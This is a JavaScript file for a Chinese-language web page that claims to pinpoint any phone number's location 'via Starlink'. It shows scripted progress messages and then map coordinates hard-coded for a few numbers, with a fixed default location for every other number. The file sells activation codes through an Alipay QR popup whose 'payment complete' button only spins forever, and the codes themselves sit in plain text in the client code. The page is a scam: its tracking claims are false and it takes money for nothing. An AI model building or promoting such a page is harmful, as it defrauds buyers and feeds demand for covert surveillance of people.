document.addEventListener('DOMContentLoaded', function() {
    // 检测设备类型
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    const isIE = window.navigator.userAgent.indexOf('MSIE ') > -1 || window.navigator.userAgent.indexOf('Trident/') > -1;
    
    // 为移动设备添加特定类
    if (isMobile) {
        document.body.classList.add('mobile-device');
        
        // 修复iOS中100vh问题
        if (isIOS) {
            const fixHeight = () => {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            };
            
            fixHeight();
            window.addEventListener('resize', fixHeight);
            window.addEventListener('orientationchange', fixHeight);
        }
    }
    
    // IE特殊处理
    if (isIE) {
        document.body.classList.add('ie-browser');
        
        // 为IE添加classList兼容
        if (!('classList' in document.documentElement)) {
            const addClassMethod = function(el, className) {
                if (!el.className.includes(className)) {
                    el.className += ' ' + className;
                }
            };
            
            const removeClassMethod = function(el, className) {
                el.className = el.className.replace(new RegExp('\\b' + className + '\\b', 'g'), '');
            };
            
            // 覆盖classList方法
            Object.defineProperty(Element.prototype, 'classList', {
                get: function() {
                    return {
                        add: function(className) { addClassMethod(this, className); }.bind(this),
                        remove: function(className) { removeClassMethod(this, className); }.bind(this)
                    };
                }
            });
        }
    }
    
    // 激活码
    const VALID_ACTIVATION_CODES = [
        "djfk3j4adf",
        "fsd23gdfg",
        "f3sd54gg",
        "13g55gvz"
    ];
    
    // 不再初始禁用提交按钮
    const submitBtn = document.querySelector('.submit-btn');
    
    // 弹窗元素
    const overlay = document.getElementById('overlay');
    const closePopupBtn = document.getElementById('closePopup');
    const confirmBtn = document.getElementById('confirmActivation');
    const cancelBtn = document.getElementById('cancelActivation');
    const popupActivationInput = document.getElementById('popupActivationCode');
    const buyBtn = document.getElementById('buyActivation');
    
    // 购买弹窗元素
    const purchaseOverlay = document.getElementById('purchaseOverlay');
    const closePurchaseBtn = document.getElementById('closePurchase');
    const purchaseBtns = document.querySelectorAll('.purchase-btn');
    
    // 保存当前处理中的状态
    let currentMessageInterval = null;
    let currentIndex = 0;
    let currentMessages = [];
    let targetMapUrl = "";
    
    // 显示弹窗
    function showPopup() {
        overlay.classList.add('active');
        setTimeout(() => {
            popupActivationInput.focus();
        }, 300);
    }
    
    // 隐藏弹窗
    function hidePopup() {
        overlay.classList.remove('active');
    }
    
    // 显示购买弹窗
    function showPurchasePopup() {
        purchaseOverlay.classList.add('active');
    }
    
    // 隐藏购买弹窗
    function hidePurchasePopup() {
        purchaseOverlay.classList.remove('active');
    }
    
    // 添加触摸设备支持
    if (isMobile) {
        // 防止在输入框聚焦时固定背景
        const preventFixedBackground = function() {
            document.body.style.position = '';
            document.body.style.top = '';
            document.body.style.width = '';
            document.body.style.height = '';
            document.body.style.overflow = '';
            window.scrollTo(0, parseInt(document.body.style.top || '0') * -1);
        };
        
        const inputs = document.querySelectorAll('input, select');
        inputs.forEach(input => {
            input.addEventListener('focus', preventFixedBackground);
            input.addEventListener('blur', preventFixedBackground);
        });
        
        // 添加触摸事件支持
        const addTouchSupport = function(element) {
            if (!element) return;
            
            // 添加触摸反馈
            element.addEventListener('touchstart', function() {
                this.classList.add('touch-active');
            }, {passive: true});
            
            element.addEventListener('touchend', function() {
                this.classList.remove('touch-active');
            }, {passive: true});
        };
        
        // 为按钮添加触摸支持
        const buttons = document.querySelectorAll('button');
        buttons.forEach(addTouchSupport);
    }
    
    // 弹窗事件监听器
    closePopupBtn.addEventListener('click', hidePopup);
    cancelBtn.addEventListener('click', hidePopup);
    
    // 购买弹窗事件监听器
    closePurchaseBtn.addEventListener('click', hidePurchasePopup);
    
    // 购买激活码按钮事件
    buyBtn.addEventListener('click', function() {
        hidePopup();
        setTimeout(() => {
            showPurchasePopup();
        }, 300);
    });
    
    // 确认按钮事件
    confirmBtn.addEventListener('click', function() {
        const popupCode = popupActivationInput.value;
        
        // 获取主表单激活码输入框
        const mainActivationInput = document.getElementById('activationCode');
        mainActivationInput.value = popupCode;
        
        // 隐藏弹窗
        hidePopup();
        
        // 如果激活码正确，触发表单提交
        if (VALID_ACTIVATION_CODES.includes(popupCode)) {
            // 触发表单提交
            document.getElementById('phoneForm').dispatchEvent(new Event('submit'));
        }
    });
    
    // 当按下Enter键时，触发确认按钮
    popupActivationInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            confirmBtn.click();
        }
    });
    
    // 处理购买按钮点击
    purchaseBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            const plan = this.getAttribute('data-plan');
            
            // 显示处理中状态
            const originalText = this.innerHTML;
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 处理中...';
            this.disabled = true;
            
            // 模拟购买流程
            const planText = plan === 'monthly' ? '3天' : plan === 'quarterly' ? '30天' : '365天';
            const priceText = this.closest('.purchase-option').querySelector('.price').textContent;
            
            // 隐藏购买弹窗并显示支付二维码
            setTimeout(() => {
                // 恢复按钮状态
                this.innerHTML = originalText;
                this.disabled = false;
                
                // 隐藏购买弹窗
                hidePurchasePopup();
                
                // 显示支付宝二维码
                showAlipayQRCode(planText, priceText.trim());
            }, 500);
        });
    });
    
    // 显示支付宝二维码
    function showAlipayQRCode(planText, priceText) {
        // 创建支付宝二维码弹窗
        const qrOverlay = document.createElement('div');
        qrOverlay.classList.add('overlay', 'active');
        qrOverlay.id = 'qrCodeOverlay';
        
        const qrPopup = document.createElement('div');
        qrPopup.classList.add('custom-popup', 'qr-popup');
        
        qrPopup.innerHTML = `
            <div class="popup-header">
                <i class="fas fa-qrcode"></i>
                <h3>请使用支付宝扫码支付</h3>
                <button id="closeQRCode" class="close-btn"><i class="fas fa-times"></i></button>
            </div>
            <div class="popup-content">
                <div class="qr-code-container">
                    <img src="images/alipay-qr1.jpg" alt="支付宝二维码" class="qr-code-img">
                </div>
                <p class="qr-description">您正在购买 <strong>${planText}</strong> 激活码，金额 <strong>${priceText}</strong></p>
                <p class="qr-instruction">扫描上方二维码完成支付</p>
                <div class="qr-buttons">
                    <button id="paymentComplete" class="popup-btn confirm-btn"><i class="fas fa-check"></i> 我已完成支付</button>
                    <button id="cancelPayment" class="popup-btn cancel-btn"><i class="fas fa-times"></i> 取消</button>
                </div>
            </div>
        `;
        
        qrOverlay.appendChild(qrPopup);
        document.body.appendChild(qrOverlay);
        
        // 添加关闭事件
        document.getElementById('closeQRCode').addEventListener('click', function() {
            document.body.removeChild(qrOverlay);
        });
        
        // 添加取消事件
        document.getElementById('cancelPayment').addEventListener('click', function() {
            document.body.removeChild(qrOverlay);
        });
        
        // 添加完成支付事件
        document.getElementById('paymentComplete').addEventListener('click', function() {
            // 禁用按钮，防止重复点击
            this.disabled = true;
            const originalText = this.innerHTML;
            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 查询支付状态...';
            
            // 显示支付查询提示 - 直接在二维码弹窗内显示
            const qrDescription = document.querySelector('.qr-description');
            qrDescription.innerHTML = `<i class="fas fa-sync fa-spin"></i> 请稍后，正在查询是否完成支付...`;
            qrDescription.style.color = '#4a6da7';
            
            // 移除下方指引文字
            const qrInstruction = document.querySelector('.qr-instruction');
            qrInstruction.style.display = 'none';
            
            // 禁用取消按钮
            document.getElementById('cancelPayment').disabled = true;
            
            // 不关闭二维码弹窗，不移除查询提示，让它们一直显示
            // 移除关闭二维码弹窗的代码
        });
    }
    
    // 激活码输入事件监听器
    document.getElementById('activationCode').addEventListener('input', function() {
        const activationError = document.getElementById('activationError');
        const activationInput = document.getElementById('activationCode');
        
        // 清除所有验证相关的类和提示
        activationError.textContent = "";
        activationInput.classList.remove('error');
        activationInput.classList.remove('valid-input');
        activationError.classList.remove('valid');
        activationError.classList.remove('highlight');
        
        // 去除多余的空格
        this.value = this.value.replace(/\s+/g, '');
    });
    
    // 弹窗激活码输入事件监听器
    popupActivationInput.addEventListener('input', function() {
        // 去除多余的空格
        this.value = this.value.replace(/\s+/g, '');
    });

    // 表单提交事件监听器
    document.getElementById('phoneForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const countryCode = document.getElementById('country').value;
        const phoneNumber = document.getElementById('phone').value;
        const activationCode = document.getElementById('activationCode').value;
        
        // 检查激活码是否正确
        if (!VALID_ACTIVATION_CODES.includes(activationCode)) {
            // 显示激活码弹窗
            showPopup();
            return;
        }
        
        // 显示状态消息
        const statusMessage = document.getElementById('statusMessage');
        statusMessage.style.display = 'block';
        statusMessage.innerHTML = `<div class="loader"></div>正在追踪${countryCode} ${phoneNumber}...`;
        
        // 滚动到状态消息区域，保证移动端用户看到进度
        if (isMobile) {
            statusMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
        
        // 定义要显示的消息
        const messages = [
            "启动星链Starlink定位中...",
            "目标已锁定...",
            "调用GoogleMaps JS API...",
            "正在请求GoogleMaps地图坐标...",
            "坐标获取成功...",
            "坐标值返回...",
            "定位成功, 感谢您的使用!"
        ];
        
        // 保存消息和处理状态，用于弹窗后恢复
        currentMessages = messages;
        currentIndex = 0;
        
        // 位置标记（先隐藏）
        const locationMarker = document.getElementById('locationMarker');
        const mapFrame = document.querySelector('.map-frame');
        
        // 禁用按钮，防止多次点击
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>追踪中...';
        
        // 根据手机号码设置不同的坐标
        // 去除手机号中的空格进行比较
        const cleanedPhoneNumber = phoneNumber.replace(/\s+/g, '');
        
        // 检查手机号码
        console.log("输入的手机号码:", phoneNumber);
        console.log("清理后的手机号码:", cleanedPhoneNumber);
        
        if (phoneNumber === "13388882646") {
            // 坐标设置为：44.136629551511724, 126.50162305208853
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3687.4!2d126.50162305208853!3d44.136629551511724!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjLCsDMyJzU4LjciTiAxMTTCsDA3JzA1LjYiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "13016044122") {
            // 坐标设置为：23.54558922773105, 113.5873670114466
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3763.2257279650283!2d113.5873670114466!3d23.54558922773105!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDMyJzQ0LjEiTiAxMTPCsDM1JzE0LjUiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        } else if (cleanedPhoneNumber === "6502318772" || phoneNumber === "650 231 8772" || phoneNumber.includes("650")) {
            // 坐标设置为：36.326581298778144, -119.24660948936832
            console.log("美国手机号匹配成功!");
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3184.6424075827864!2d-119.24660948936832!3d36.326581298778144!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzbCsDE5JzM1LjciTiAxMTlCsDE0JzQ3LjgiVw!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        } else if (phoneNumber === "13352812100") {
            // 坐标设置为：23.002261672520113, 113.12495127388613
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3687.4!2d113.12495127388613!3d23.002261672520113!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDA3JzEzLjEiTiAxMTPCsDIxJzU3LjAiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "13352812170") {
            // 坐标设置为：23.002261672520113, 113.12495127388613
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3687.4!2d113.12495127388613!3d23.002261672520113!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDA3JzEzLjEiTiAxMTPCsDIxJzU3LjAiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "13352812110") {
            // 坐标设置为：23.00225251845458, 113.12492641193553
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3687.4!2d113.12492641193553!3d23.00225251845458!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDAwJzA4LjEiTiAxMTPCsDA3JzI5LjciRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        // 添加更多手机号码判断
        else if (phoneNumber === "13800138000") {
            // 北京天安门坐标：39.908717, 116.397499
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3053.4!2d116.397499!3d39.908717!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMznCsDU0JzMxLjQiTiAxMTbCsDIzJzUxLjAiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "18612345678") {
            // 上海东方明珠坐标：31.239689, 121.499755
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3222.1!2d121.499755!3d31.239689!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzHCsDE0JzIyLjkiTiAxMjHCsDI5JzU5LjEiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "15987654321") {
            // 广州塔坐标：23.105732, 113.322258
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3763.9!2d113.322258!3d23.105732!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjPCsDA2JzIwLjYiTiAxMTPCsDE5JzIwLjEiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "17600001234") {
            // 成都春熙路坐标：30.652344, 104.082086
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3435.2!2d104.082086!3d30.652344!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzDCsDM5JzA4LjQiTiAxMDTCsDA0JzU1LjUiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "17055552646") {
            // 坐标设置为：44.13662248271068, 126.50163290158687
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3687.4!2d126.50163290158687!3d44.13662248271068!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zNDTCsDA4JzExLjgiTiAxMjbCsDMwJzA1LjkiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else if (phoneNumber === "13900001111") {
            // 西安钟楼坐标：34.259155, 108.942451
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3165.4!2d108.942451!3d34.259155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMzTCsDE1JzMzLjAiTiAxMDjCsDU2JzMyLjgiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        else {
            // 默认使用之前的坐标：22.727928998586016, 113.84220580896196
            targetMapUrl = "https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3684.5494214967284!2d113.84220580896196!3d22.727928998586016!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zMjLCsDQzJzQwLjUiTiAxMTPCsDUwJzMxLjkiRQ!5e0!3m2!1sen!2sus!4v1616507023425!5m2!1sen!2sus";
        }
        
        // 逐行显示消息，添加打字机效果
        currentMessageInterval = setInterval(() => {
            if (currentIndex < messages.length) {
                const isLastMessage = currentIndex === messages.length - 1;
                const messageClass = isLastMessage ? 'success-message' : '';
                const icon = isLastMessage ? '<i class="fas fa-check-circle" style="color: var(--success-color);"></i> ' : '<div class="loader"></div>';
                statusMessage.innerHTML += `<br>${icon}<span class="${messageClass}">${messages[currentIndex]}</span>`;
                
                // 滚动到最新消息
                statusMessage.scrollTop = statusMessage.scrollHeight;
                
                // 当消息显示到"目标已锁定..."时，检查激活码
                if (currentIndex === 1 && !VALID_ACTIVATION_CODES.includes(activationCode)) {
                    // 清除消息间隔，停止显示后续消息
                    clearInterval(currentMessageInterval);
                    
                    // 添加一个小延迟，让用户能看到"目标已锁定..."的消息
                    setTimeout(() => {
                        // 显示自定义弹窗
                        showPopup();
                        
                        // 重置弹窗输入框
                        popupActivationInput.value = '';
                        popupActivationInput.classList.remove('error');
                    }, 500);
                    
                    return;
                }
                
                currentIndex++;
            } else {
                clearInterval(currentMessageInterval);
                // 所有消息显示完毕后更改地图坐标
                setTimeout(() => {
                    // 更改地图坐标
                    const iframe = document.querySelector('.map-frame iframe');
                    iframe.src = targetMapUrl;
                    
                    // 恢复按钮状态
                    setTimeout(() => {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = '<i class="fas fa-satellite"></i>开始追踪';
                        
                        // 在移动设备上显示成功后滚动到地图
                        if (isMobile) {
                            const mapContainer = document.querySelector('.map-container');
                            mapContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }, 1000);
                    
                }, 500); // 短暂延迟后更改地图
            }
        }, 1000); // 每秒显示一行
    });
    
    // 处理弹窗的适配
    const handleResize = () => {
        // 调整弹窗大小
        if (window.innerWidth < 768) {
            const popups = document.querySelectorAll('.custom-popup');
            popups.forEach(popup => {
                popup.style.maxHeight = `${window.innerHeight * 0.8}px`;
                popup.style.overflow = 'auto';
            });
        }
    };
    
    // 初始调整和窗口大小变化时调整
    handleResize();
    window.addEventListener('resize', handleResize);
    window.addEventListener('orientationchange', handleResize);

    // 国家选择事件监听器
    document.getElementById('country').addEventListener('change', function() {
        const countryCode = this.value;
        const phoneInput = document.getElementById('phone');
        
        // 根据不同国家设置不同的验证规则
        if (countryCode === '+86') {
            phoneInput.pattern = '[0-9]{11}';
            phoneInput.placeholder = '输入11位手机号码';
        } else if (countryCode === '+1') {
            phoneInput.pattern = '[0-9\\s]{10,12}';
            phoneInput.placeholder = '输入美国手机号码';
        } else {
            phoneInput.pattern = '[0-9\\s]{5,15}';
            phoneInput.placeholder = '输入手机号码';
        }
    });
    
    // 手机号输入事件监听器
    document.getElementById('phone').addEventListener('input', function() {
        const countryCode = document.getElementById('country').value;
        
        // 对美国号码自动格式化
        if (countryCode === '+1') {
            // 移除所有非数字字符
            let phoneNumber = this.value.replace(/\D/g, '');
            
            // 添加空格格式化 xxx xxx xxxx
            if (phoneNumber.length > 3 && phoneNumber.length <= 6) {
                this.value = phoneNumber.slice(0, 3) + ' ' + phoneNumber.slice(3);
            } else if (phoneNumber.length > 6) {
                this.value = phoneNumber.slice(0, 3) + ' ' + phoneNumber.slice(3, 6) + ' ' + phoneNumber.slice(6, 10);
            } else {
                this.value = phoneNumber;
            }
        }
    });
});
